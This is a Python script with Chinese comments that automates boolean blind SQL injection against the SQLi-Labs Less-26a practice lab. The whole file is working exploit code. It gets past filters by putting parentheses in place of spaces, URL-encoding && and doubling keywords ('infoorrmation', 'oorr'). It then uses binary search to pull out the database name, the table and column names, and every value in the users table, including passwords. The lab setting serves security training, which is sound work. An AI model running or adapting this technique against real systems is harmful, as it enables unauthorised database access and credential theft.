# -*- coding: utf-8 -*-
"""
SQLi-Labs Less-26a 布尔盲注自动化脚本
空格全禁 + 注释全禁 + 无报错 → 布尔盲注

用法: python sqli-26a-blind.py
"""
import requests
import string

TARGET = "http://sqli-labs:8848/Less-26a/"
SUCCESS_MARKER = "Login name"
CHARSET = string.ascii_lowercase + string.digits + "_,-@!~:."


def check(condition: str) -> bool:
    """发送盲注请求，返回条件真/假"""
    url = f"{TARGET}?id=1')%26%26{condition}%26%26('1"
    try:
        resp = requests.get(url, timeout=10)
        return SUCCESS_MARKER in resp.text
    except requests.RequestException as e:
        print(f"  [!] 请求失败: {e}")
        return False


def get_length(subquery: str) -> int:
    """二分法探测子查询结果的长度"""
    lo, hi = 0, 1024
    while lo < hi:
        mid = (lo + hi + 1) // 2
        cond = f"((select(length(({subquery}))))>={mid})"
        if check(cond):
            lo = mid
        else:
            hi = mid - 1
    return lo


def get_char_by_char(subquery: str, length: int, label: str = "") -> str:
    """逐字符爆破，每字符用 ASCII 二分法"""
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"(ascii(substr(({subquery}),{pos},1))>{mid})"
            if check(cond):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        print(f"  [{pos}/{length}] {label}{result}")
    return result


def brute_char_by_char(subquery: str, length: int, label: str = "") -> str:
    """逐字符逐个字符集爆破（比 ASCII 二分多跑几次请求但更稳）"""
    result = ""
    for pos in range(1, length + 1):
        found = False
        for c in CHARSET:
            cond = f"(substr(({subquery}),{pos},1)='{c}')"
            if check(cond):
                result += c
                print(f"  [{pos}/{length}] {label}{result}")
                found = True
                break
        if not found:
            # 不在 CHARSET 里 → 用 ASCII 二分管它什么字符
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                cond = f"(ascii(substr(({subquery}),{pos},1))>{mid})"
                if check(cond):
                    lo = mid + 1
                else:
                    hi = mid
            result += chr(lo)
            print(f"  [{pos}/{length}] {label}{result}  (ASCII {lo})")
    return result


def main():
    print("=" * 50)
    print("SQLi-Labs Less-26a 布尔盲注")
    print("=" * 50)

    # 阶段 1：爆库名
    print("\n[阶段 1] 数据库名...")
    db_subquery = "database()"
    db_len = get_length(db_subquery)
    print(f"  库名长度: {db_len}")
    db_name = brute_char_by_char(db_subquery, db_len)
    print(f"  → 数据库: {db_name}")

    # 阶段 2：爆表名
    print("\n[阶段 2] 表名...")
    table_subquery = (
        "(select(group_concat(table_name))"
        "from(infoorrmation_schema.tables)"
        "where(table_schema=database()))"
    )
    table_len = get_length(table_subquery)
    print(f"  表名总长度: {table_len}")
    tables = brute_char_by_char(table_subquery, table_len, "表名: ")
    print(f"  → 所有表: {tables}")

    # 自动找到 users 表
    table_names = [t.strip() for t in tables.split(",")]
    target_table = "users" if "users" in table_names else table_names[-1]
    print(f"  目标表: {target_table}")

    # 阶段 3：爆列名
    print(f"\n[阶段 3] {target_table} 的列...")
    col_subquery = (
        f"(select(group_concat(column_name))"
        f"from(infoorrmation_schema.columns)"
        f"where(table_schema=database())"
        f"%26%26(table_name='{target_table}'))"
    )
    col_len = get_length(col_subquery)
    print(f"  列名总长度: {col_len}")
    columns = brute_char_by_char(col_subquery, col_len, "列名: ")
    print(f"  → 所有列: {columns}")

    # 阶段 4：爆数据（passwoorrd 双写避 or 过滤）
    col_names = [c.strip() for c in columns.split(",")]
    print(f"\n[阶段 4] 数据...")
    for col in col_names:
        if col == "id":
            continue
        safe_col = col.replace("or", "oorr")
        data_subquery = f"(select(group_concat({safe_col}))from({target_table}))"
        print(f"  正在爆 {col}...")
        data_len = get_length(data_subquery)
        if data_len == 0:
            print(f"  {col} 长度为 0，跳过")
            continue
        data = brute_char_by_char(data_subquery, data_len, f"{col}: ")
        print(f"  → {col}: {data}")

    print("\n" + "=" * 50)
    print("Done!")
    print("=" * 50)


if __name__ == "__main__":
    main()
